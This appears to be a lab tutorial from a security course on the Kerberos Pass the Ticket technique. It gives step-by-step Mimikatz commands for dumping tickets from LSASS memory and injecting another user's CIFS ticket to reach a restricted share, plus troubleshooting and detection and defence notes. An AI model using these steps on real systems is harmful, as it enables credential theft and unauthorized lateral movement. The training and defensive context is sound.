## Overview

**Pass the Ticket** is a lateral movement technique where a Kerberos ticket is exported from one session and injected into another session.

The goal is to reuse someone else’s Kerberos ticket to access a service as that user.

Simple idea:

```text
Find another user's Kerberos ticket
↓
Export it
↓
Inject it into your own session
↓
Use it to access the service
```

In this example:

```text
jen cannot access \\web04\backup
dave can access \\web04\backup
dave has a cached CIFS ticket for WEB04
we inject dave's ticket into jen's session
jen can now access the share as dave
```

---

# Simple Mental Model

A Kerberos ticket is like a temporary access pass.

If a user has already accessed a service, Windows may cache a ticket for that service.

If you can extract that ticket and inject it into your own session, your session can present that ticket to the service.

The service then sees the ticket as belonging to the original user.

```text
dave's ticket for CIFS on WEB04
↓
injected into jen's session
↓
jen accesses \\web04\backup
↓
WEB04 accepts the ticket as dave
```

---

# TGT vs TGS

## TGT

A **Ticket Granting Ticket** is used to request service tickets.

It is not tied to one specific service.

```text
TGT = general Kerberos ticket
```

Example:

```text
krbtgt/CORP.COM
```

A TGT can usually be reused during its lifetime to request TGS tickets for multiple services.

Typical lifetime:

```text
around 10 hours
```

---

## TGS

A **Ticket Granting Service ticket** is for one specific service.

```text
TGS = service-specific Kerberos ticket
```

Example:

```text
cifs/web04
```

A TGS for `cifs/web04` can be used to access:

```text
SMB / file sharing on WEB04
```

It cannot be reused for unrelated services such as:

```text
HTTP/web04
CIFS/files04
LDAP/dc1
```

---

# Key Difference

| Ticket | Scope | Example |
|---|---|---|
| TGT | Can request more service tickets | `krbtgt/CORP.COM` |
| TGS | Only valid for one service | `cifs/web04` |

Plain English:

```text
TGT = reusable to request service tickets.
TGS = usable only against the service it was issued for.
```

---

# Pass the Ticket vs Overpass the Hash

| Technique | Starts With | Goal |
|---|---|---|
| Overpass the Hash | NTLM hash | Obtain Kerberos tickets |
| Pass the Ticket | Kerberos ticket | Reuse an existing Kerberos ticket |

Plain English:

```text
Overpass the Hash turns a hash into tickets.
Pass the Ticket reuses tickets that already exist.
```

---

# Important Privilege Note

If you are injecting a ticket that belongs to the current user, administrative privileges may not be required.

However, to extract tickets from LSASS memory for other users, you usually need:

```text
local administrator
SYSTEM
SeDebugPrivilege
```

In this lesson, Mimikatz is used to export tickets from memory, so administrative access is required.

# Step 1 – Confirm Current User Cannot Access the Share

Run:

```powershell
whoami
```

Expected:

```text
corp\jen
```

Try to list the restricted share:

```powershell
ls \\web04\backup
```

Expected failure:

```text
Access to the path '\\web04\backup' is denied.
```

Interpretation:

```text
jen does not have access to the backup share.
```

This gives a clean before/after test.

---

# Step 2 – Start Mimikatz and Enable Debug Privilege

Launch Mimikatz from an elevated PowerShell session:

```powershell
cd C:\Tools
.\mimikatz.exe
```

Enable debug privilege:

```text
privilege::debug
```

Expected output:

```text
Privilege '20' OK
```

Meaning:

```text
Mimikatz can interact with protected processes such as LSASS.
```

---

# Step 3 – Export Kerberos Tickets

Run:

```text
sekurlsa::tickets /export
```

What this does:

```text
searches LSASS memory for Kerberos tickets
exports TGTs and TGS tickets to disk
saves them in .kirbi format
```

Output format:

```text
*.kirbi
```

Example saved ticket:

```text
[0;1f1626]-2-0-40c10000-dave@krbtgt-CORP.COM.kirbi
```

Interpretation:

```text
This is a Kerberos ticket belonging to dave.
```

---

# Step 4 – List Exported Tickets

Exit Mimikatz or open PowerShell in the output directory.

List `.kirbi` files:

```powershell
dir *.kirbi
```

Example output:

```text
[0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
[0;12bd0]-2-0-40c10000-dave@krbtgt-CORP.COM.kirbi
[0;1c6860]-0-0-40810000-dave@cifs-web04.kirbi
[0;1c6860]-2-0-40c10000-dave@krbtgt-CORP.COM.kirbi
```

---

# Step 5 – Choose the Right Ticket

We want access to:

```text
\\web04\backup
```

That is SMB/file sharing.

The Kerberos service name for SMB/file sharing is usually:

```text
CIFS
```

So choose a ticket that includes:

```text
dave@cifs-web04
```

Example:

```text
[0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
```

Do not choose the `krbtgt` ticket for this specific example unless the workflow specifically calls for using a TGT.

For direct access to `\\web04\backup`, the service-specific ticket is:

```text
cifs/web04
```

---

# Step 6 – Inject the Ticket

In Mimikatz, run:

```text
kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
```

Expected output:

```text
* File: '[0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi': OK
```

Meaning:

```text
The ticket was injected successfully into the current session.
```

`ptt` means:

```text
Pass the Ticket
```

---

# Step 7 – Confirm the Ticket Is Loaded

Run:

```cmd
klist
```

Expected output:

```text
Cached Tickets: (1)

#0>     Client: dave @ CORP.COM
        Server: cifs/web04 @ CORP.COM
```

Interpretation:

```text
The current session now contains dave's CIFS ticket for WEB04.
```

Important fields:

| Field | Meaning |
|---|---|
| `Client: dave` | Ticket belongs to dave |
| `Server: cifs/web04` | Ticket is for SMB on WEB04 |
| `Cached Tickets: (1)` | Ticket is loaded in this session |

---

# Step 8 – Access the Restricted Share

Try again:

```powershell
ls \\web04\backup
```

Expected success:

```text
Directory: \\web04\backup

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        9/13/2022   2:52 AM              0 backup_schemata.txt
```

Interpretation:

```text
Access succeeded because the session presented dave's CIFS ticket.
```

# How to Pick the Correct `.kirbi` File

Match the ticket to the service you want.

| Goal | Ticket to Look For |
|---|---|
| Access SMB share on WEB04 | `cifs-web04` |
| Access web app on WEB04 | `http-web04` |
| Access LDAP on DC1 | `ldap-dc1` |
| Access HOST service | `host-target` |
| Use TGT to request more tickets | `krbtgt-CORP.COM` |

For this lesson:

```text
Target share: \\web04\backup
Required service: CIFS
Ticket needed: dave@cifs-web04.kirbi
```

---

# Why This Works

The target service checks the Kerberos ticket.

The CIFS service on WEB04 sees:

```text
Client: dave
Server: cifs/web04
```

Since `dave` has access to the backup share, WEB04 allows access.

The current Windows session belongs to `jen`, but the network authentication uses the injected ticket.

Plain English:

```text
Local identity may be jen.
Network ticket says dave.
WEB04 accepts dave's ticket.
```

---

# Common Confusion

## Does This Change whoami?

Usually, no.

Running:

```cmd
whoami
```

may still show:

```text
corp\jen
```

Why:

```text
whoami checks the local process token.
Pass the Ticket changes available Kerberos tickets for network authentication.
```

Validate with:

```cmd
klist
```

and by accessing the target service.

---

## Can I Use Any Ticket Anywhere?

No.

A TGS is service-specific.

Example:

```text
cifs/web04
```

only works for:

```text
SMB/CIFS on WEB04
```

It will not work for:

```text
CIFS on FILES04
HTTP on WEB04
LDAP on DC1
```

---

## Why Are There Multiple Similar Tickets?

There may be multiple logon sessions or repeated tickets.

Example:

```text
[0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
[0;1c6860]-0-0-40810000-dave@cifs-web04.kirbi
```

In this lab, any valid `dave@cifs-web04` TGS should work for accessing WEB04’s SMB share.

Example:

```text
[0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
```

Useful parts:

| Part | Meaning |
|---|---|
| `dave` | Client user |


# Troubleshooting

## `kerberos::ptt` Says OK but Access Is Denied

Check:

```text
ticket is for the correct service
ticket is for the correct host
ticket belongs to a user with access
ticket is not expired
you are using hostname, not IP
target service uses Kerberos
ticket was injected into the correct session
```

For SMB on WEB04, use:

```text
cifs/web04
```

Access with:

```powershell
ls \\web04\backup
```

Avoid:

```powershell
ls \\192.168.50.x\backup
```

because IP-based access may not match the Kerberos SPN.

---

## No Useful Tickets Exported

Possible causes:

```text
target user does not have a session on the machine
target user has not accessed the desired service
ticket expired
LSASS protections block extraction
not running as admin
```

---

## `klist` Does Not Show the Ticket

Possible causes:

```text
ticket injected into a different logon session
Mimikatz was not run in the session you are testing
injection failed
shell was restarted
```

Try:

```text
run klist from the same PowerShell/cmd context
repeat kerberos::ptt
```

---

## Ticket Is for krbtgt, Not CIFS

A `krbtgt` ticket is a TGT.

For direct share access in this lab, select:

```text
dave@cifs-web04.kirbi
```

not:

```text
dave@krbtgt-CORP.COM.kirbi
```

# Detection and Defensive Notes

## Detection Opportunities

Pass the Ticket may generate:

```text
Mimikatz execution
LSASS access
SeDebugPrivilege usage
Kerberos ticket export
.kirbi file creation
ticket injection
service access using injected ticket
unusual Kerberos client/service combinations
access by a user from an unusual host
```

Suspicious patterns:

```text
user accesses a service from a host they do not normally use
ticket appears without normal logon activity
klist shows ticket for another user
.kirbi files written to disk
LSASS read followed by service access
```

---

## Defensive Controls

Reduce Pass the Ticket risk by:

```text
protecting LSASS
enabling Credential Guard where possible
enabling LSA Protection
limiting local administrator rights
preventing privileged users from logging into lower-tier hosts
monitoring .kirbi file creation
monitoring Kerberos ticket anomalies
using tiered administration
reducing ticket lifetimes where appropriate
monitoring unusual service access
```

# Key Takeaways

- Pass the Ticket reuses Kerberos tickets.
- A TGT can request service tickets during its lifetime.
- A TGS is tied to one specific service.
- In this lesson, `dave` has access to `\\web04\backup`, but `jen` does not.
- Mimikatz can export tickets from LSASS with `sekurlsa::tickets /export`.
- Exported tickets are saved as `.kirbi` files.
- For SMB access to WEB04, choose a `cifs-web04` ticket.
- Mimikatz injects tickets with `kerberos::ptt`.
- `klist` confirms whether the ticket is loaded.
- `whoami` may still show the original user because local token identity is separate from Kerberos network authentication.
- Service tickets must match the target service and host.
- Successful ticket injection can allow access to resources as the ticket owner.
